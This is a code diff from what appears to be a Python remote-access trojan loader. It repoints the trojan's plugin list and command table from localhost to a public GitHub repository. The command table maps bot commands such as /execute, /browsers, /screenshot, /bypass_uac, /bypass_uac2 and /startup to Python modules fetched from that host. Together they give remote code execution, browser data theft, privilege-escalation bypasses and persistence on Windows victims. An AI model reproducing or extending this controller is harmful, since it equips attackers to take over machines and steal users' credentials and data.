@@ -33,28 +33,28 @@ class Loader():
 		self.ip = data["ip"]
 		self.country = data["country"]
 		self.privileges = "Administrator" if ctypes.windll.shell32.IsUserAnAdmin() == 1 else "User"
-		self.plugins = requests.get('http://127.0.0.1/json.js').json()
+		self.plugins = requests.get('https://raw.githubusercontent.com/UQABXO/DARK-X3/main/Plugins.json').json()
 		thread = threading.Thread(target = self.Auto_Close)
 		thread.start()
 		self.commands = {
-			"/geo" 			:		["http://127.0.0.1/Classes/Geo.py",			True],
-			"/sys_info"		:		["http://127.0.0.1/Classes/Sys_Info.py",	True],
-			"/close"		:		["http://127.0.0.1/Classes/Close.py",		False],
-			"/restart"		:		["http://127.0.0.1/Classes/Restart.py",		True],
-			"/execute"		:		["http://127.0.0.1/Classes/Execute.py",		True],
-			"/get_log"		:		["http://127.0.0.1/Classes/Get_Log.py",		True],
-			"/clear_log"	:		["http://127.0.0.1/Classes/Clear_Log.py",	True],
-			"/get"			: 		["http://127.0.0.1/Classes/Get.py",			True],
-			"/screenshot"	:		["http://127.0.0.1/Classes/Screenshot.py",	True],
-			"/browsers"		:		["http://127.0.0.1/Classes/Browsers.py",	True],
-			"/bypass_uac"	:		["http://127.0.0.1/Classes/Bypass_UAC.py",	True],
-			"/bypass_uac2"	:		["http://127.0.0.1/Classes/Bypass_UAC2.py",	True],
-			"/ask_admin"	:		["http://127.0.0.1/Classes/Ask_Admin.py",	False],
-			"/edit_note"	:		["http://127.0.0.1/Classes/Edit_Note.py",	True],
-			"/plugin"		:		["http://127.0.0.1/Classes/Plugin.py",		True],
-			"/pip"			:		["http://127.0.0.1/Classes/PIP.py",			True],
-			"/update"		:		["http://127.0.0.1/Classes/Update.py",		True],
-			"/startup"		:		["http://127.0.0.1/Classes/Startup.py",		True]
+			"/geo" 			:		["https://raw.githubusercontent.com/UQABXO/DARK-X3/main/Classes/Geo.py",			True],
+			"/sys_info"		:		["https://raw.githubusercontent.com/UQABXO/DARK-X3/main/Classes/Sys_Info.py",		True],
+			"/close"		:		["https://raw.githubusercontent.com/UQABXO/DARK-X3/main/Classes/Close.py",			False],
+			"/restart"		:		["https://raw.githubusercontent.com/UQABXO/DARK-X3/main/Classes/Restart.py",		True],
+			"/execute"		:		["https://raw.githubusercontent.com/UQABXO/DARK-X3/main/Classes/Execute.py",		True],
+			"/get_log"		:		["https://raw.githubusercontent.com/UQABXO/DARK-X3/main/Classes/Get_Log.py",		True],
+			"/clear_log"	:		["https://raw.githubusercontent.com/UQABXO/DARK-X3/main/Classes/Clear_Log.py",		True],
+			"/get"			: 		["https://raw.githubusercontent.com/UQABXO/DARK-X3/main/Classes/Get.py",			True],
+			"/screenshot"	:		["https://raw.githubusercontent.com/UQABXO/DARK-X3/main/Classes/Screenshot.py",		True],
+			"/browsers"		:		["https://raw.githubusercontent.com/UQABXO/DARK-X3/main/Classes/Browsers.py",		True],
+			"/bypass_uac"	:		["https://raw.githubusercontent.com/UQABXO/DARK-X3/main/Classes/Bypass_UAC.py",		True],
+			"/bypass_uac2"	:		["https://raw.githubusercontent.com/UQABXO/DARK-X3/main/Classes/Bypass_UAC2.py",	True],
+			"/ask_admin"	:		["https://raw.githubusercontent.com/UQABXO/DARK-X3/main/Classes/Ask_Admin.py",		False],
+			"/edit_note"	:		["https://raw.githubusercontent.com/UQABXO/DARK-X3/main/Classes/Edit_Note.py",		True],
+			"/plugin"		:		["https://raw.githubusercontent.com/UQABXO/DARK-X3/main/Classes/Plugin.py",			True],
+			"/pip"			:		["https://raw.githubusercontent.com/UQABXO/DARK-X3/main/Classes/PIP.py",			True],
+			"/update"		:		["https://raw.githubusercontent.com/UQABXO/DARK-X3/main/Classes/Update.py",			True],
+			"/startup"		:		["https://raw.githubusercontent.com/UQABXO/DARK-X3/main/Classes/Startup.py",		True]
 		}
 		if len(sys.argv) == 2:
 			self.Send_Notification()
